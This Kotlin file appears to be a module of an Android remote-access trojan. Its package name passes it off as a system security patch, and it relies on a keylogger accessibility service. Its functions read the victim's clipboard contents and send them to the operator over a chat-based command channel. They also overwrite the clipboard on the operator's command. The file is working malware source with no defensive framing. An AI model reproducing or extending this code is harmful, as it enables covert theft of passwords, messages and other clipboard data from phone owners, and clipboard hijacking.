package com.android.security.patch.commands

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import com.android.security.patch.KeylogService
import com.android.security.patch.RatApi

object Clipboard {
    fun read(ctx: Context, chatId: Long) {
        Thread {
            try {
                // coba lewat accessibility dulu (paling reliable di A10+)
                val svc = KeylogService.instance
                val cm = (svc ?: ctx).getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = cm.primaryClip
                if (clip == null || clip.itemCount == 0) {
                    RatApi.sendMessage(ctx, "clipboard empty", chatId); return@Thread
                }
                val sb = StringBuilder("<b>📋 clipboard</b>\n")
                for (i in 0 until clip.itemCount) {
                    val it = clip.getItemAt(i)
                    val txt = it.text?.toString() ?: it.uri?.toString() ?: ""
                    sb.append("<pre>").append(txt).append("</pre>\n")
                }
                RatApi.sendMessage(ctx, sb.toString(), chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "clipboard err: ${e.message}", chatId)
            }
        }.start()
    }

    fun write(ctx: Context, chatId: Long, args: Array<String>) {
        val text = args.joinToString(" ")
        if (text.isBlank()) {
            RatApi.sendMessage(ctx, "usage: /clipboard_set <text>", chatId); return
        }
        try {
            val svc = KeylogService.instance
            val cm = (svc ?: ctx).getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.setPrimaryClip(ClipData.newPlainText("text", text))
            RatApi.sendMessage(ctx, "clipboard set", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "clipboard_set err: ${e.message}", chatId)
        }
    }
}
